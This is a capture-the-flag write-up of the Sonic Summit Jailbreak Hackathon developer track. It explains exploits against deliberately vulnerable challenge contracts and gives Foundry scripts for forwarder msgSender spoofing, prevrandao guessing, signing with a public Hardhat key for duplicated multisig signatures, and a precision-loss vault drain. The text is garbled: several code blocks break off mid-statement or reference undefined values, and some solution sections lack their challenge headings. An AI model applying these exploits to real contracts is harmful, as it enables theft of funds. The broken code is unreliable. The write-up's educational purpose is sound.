I played Sonic Summit Jailbreak Hackathon 2025 with my teammate [Y4nhu1](https://sekai.team/members/yanhu). The Hackathon consists of two distinct tracks â€” users and developers â€” compete simultaneously to drain a prize pot of over 55,000 \$S secured in a smart contract. In developer track, developers must identify and exploit a deliberate vulnerability embedded by Cantina in the prize pot smart contract.

- **Mechanics**: Developers analyze provided smart contract code, aiming to discover an exploit or vulnerability that will allow them to drain assets held in the smart contract.
- **Challenge**: Technical expertise and rapid problem-solving to uncover the vulnerability.
- **Win Condition**: Demonstrate the ability to drain the prize pot and claim funds through a verification process on Cantina.

We ended up with the only team that completed all challenges, and received half of the prizes (around 27,500 \$S tokens). The interesting part was [pot contract](https://sonicscan.org/address/0x38dd721dFd51FdEe02e6641e0CE0d5872aDB90B1). After solving each challenge, the challenge contract calls `addPoints` function in pot contract, and when a user reaches 200 points, they can call the `claimWin` function to get an NFT token. But that doesnâ€™t mean we can withdraw the prize :D (We received the prize after a month when \$S halvedðŸ˜”)

You can check the hackathon information & challenges here:
- [Sonic Summit Jailbreak Hackathon 2025: Users vs Developers](https://blog.soniclabs.com/sonic-summit-jailbreak-hackathon-2025-users-vs-developers/)
- [Dev Track Challenges on GitHub](https://github.com/cantinasec/vienna_hackathon_2025)

All the transaction hashes can be found in [sonicscan.org](https://sonicscan.org/). Overall, this was a fun contest with interesting mechanisms for claiming prizes. Below are brief writeups for all the challenges. (Note: This excludes one challenge which was basically unsolvable by player. Solving other 7 challenges with first bloods successfully accumulated us 200 points required.)

## Eu Tu, Proxy?

> Fiona Fox was on her way to discovering a magical proxy implementation. She stumbled upon a hidden function with a signature broad enough to allow the new owner of the proxy to be set, ideally enabling her to steal all the winning points.
> 
> She concealed the secret function signature and asked her friend Knuckles to guess it. Knuckles began by guessing: transferOwnership, transferOwner, updateOwner, ....

Transaction hash: `0x5bcd073052cfaafda0b38ee976d6612f937c967112651cbc9510b8203eabfc6e`, `0xf1f8616a6ac71d852d17d82f63fd943760d3e88b1f82e6c76909c03c78d8c015`.

### Solution

Find the [contract bytecode](https://sonicscan.org/address/0xb73e7da3fa04a37bbe6be13ca4f1ec68b82a8a26#code) and feed it into [bytegraph](https://bytegraph.xyz/bytecode/fe3a91f69e05d65559ab1cfe08f58bcb/graph) (The link may expire).

The `slot 1` address has code that sets the `slot 2` to calldata, so using fallback to delecatecall `slot 1` address, set `slot 2` to my address and call  `_0x57c1669d` to claim the points.

## MIGHTYâ€™s IDENTITY CRISIS

> Mighty has developed the ultimate identity verification system! Heâ€™s so confident that only smart contracts can call his function that heâ€™s put his challenge points behind it. But wait... something feels off.

### Solution

`onlyContract()` checks the `msg.sender`, while `_msgSender()` that is passed to the `pot.addPoints()` can be set by the forwarder. Use the forwarder to call `solve()`, the forwarder can pass the `onlyContract` check, while the player gets the point.

```js
import "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract Easy1Script is Script {

    function run() public {
        vm.startBroadcast();
        address player = vm.envAddress("PLAYER");
        uint256 priv = vm.envUint("PLAYER_PRIV_KEY");

        address chall = 0x1237B533A88612E27aE447f7D84aa7Eb6722e39D;
        ERC2771Forwarder forwarder = ERC2771Forwarder(0x141Fb23a7087ebb9858FEDC320DE5371C7e84cA2);

        ERC2771Forwarder.ForwardRequestData memory req = ERC2771Forwarder.ForwardRequestData(
            player, // from
            address(chall),   // to
            0,  // value
            300000, // gas
            uint48(block.timestamp + 1 minutes),  // deadline
            abi.encodeWithSignature("solve()"),
            new bytes(0) // signature
        );

        bytes32 separator = keccak256(
            abi.encode(
                keccak256(
                    "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
                ),
                keccak256(bytes("Forwarder")),
                keccak256(bytes("1")),
                146,
                address(forwarder)
            )
        );
        bytes32 forwarderTypeHash = keccak256(
            "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)"

            separator,
            keccak256(
                abi.encode(
                    forwarderTypeHash,
                    req.from,
                    req.to,
                    req.value,
                    req.gas,
                    0,
                    req.deadline,
                    keccak256(req.data)
                )
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

### Solution

Contracts in the same block use the same `block.prevrandao`. Based on the use of the forwarder in `Easy 1`, use a helper function to determine whether to call the challenge contract based on the random result.
    
```js
contract Helper {
    bytes32 constant separator = 0xb0b9bfbe3cefbfdc6d6872e4aff4cb89d1b82df01a5fc1446178b784a19efd3c;
    bytes32 constant forwarderTypeHash = 0x7f96328b83274ebc7c1cf4f7a3abda602b51a78b7fa1d86a2ce353d75e587cac;
    ERC2771Forwarder public forwarder;

    constructor(ERC2771Forwarder _forwarder) {
        forwarder = _forwarder;
    }

    function getHash(address from, address to, uint nonce, uint48 deadline, bytes calldata data) public view returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(
            separator,
            keccak256(
                abi.encode(
                    forwarderTypeHash,
                    from,
                    to,
                    0,
                    300000,
                    nonce,
                    deadline,
                    keccak256(data)
                )
            )
        );
    }

    function helpCall(ERC2771Forwarder.ForwardRequestData memory req, uint256 guess) public {
        if (block.prevrandao % 26 == guess) {
            forwarder.execute(req);
            return;
        }
        revert("Not matched");
    }

### Solution

The `imadeadbeef` function requires two parameters, it concats two params and hash, then compares with value at storage 4 (`0x98de0bff1fd1afdd3978d3dc3a57fc8af4b4d05ca4d23f4ec3593c0276ce0eb9`). This challenge involved a LOT of guess work, and we tried different brute-force scripts, but none was working. Eventually, we figured out `codehash` and `codesize` were the correct answers.

### Solution

We searched `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266` address on Google, and found a private key from StackExchange [Hardhat local network keys generation](https://ethereum.stackexchange.com/questions/94886/hardhat-local-network-keys-generation). We could sign arbitrary message and send the same signed messages in `multisig` function to solve.

```js

    function run() public {
        vm.startBroadcast();
        address deploy = 0x6Dd509F963820F3950A56E3C0ABECdF8b3e92434;

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signer_private_key, message);
        IPermitToReenter.Sig[] memory sig = new IPermitToReenter.Sig[](3);
        sig[0] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s});
        sig[1] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s});
        sig[2] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s});

### Solution

There is a precision loss in `vaultLib.calcAssetForWithdrawals()`. So, the amount required to burn will be much less than the metricâ€™s deducted amount. In this case, after burning, the metric becomes zero, while the user still holds some tokens.

```js
contract Hard1Script is Script {

    function run() public {
        vm.startBroadcast();
        
        ChallengeHard1 chall = ChallengeHard1(payable(0x68283749b8933E57fdBCA021fcCa03bcfB539199));

        chall.ingressLiquidity{value: 1 ether + 1000}();
        chall.egressLiquidity(1 ether + 1000);
        chall.verifySystemCompletion();

        vm.stopBroadcast();
    }
}
```
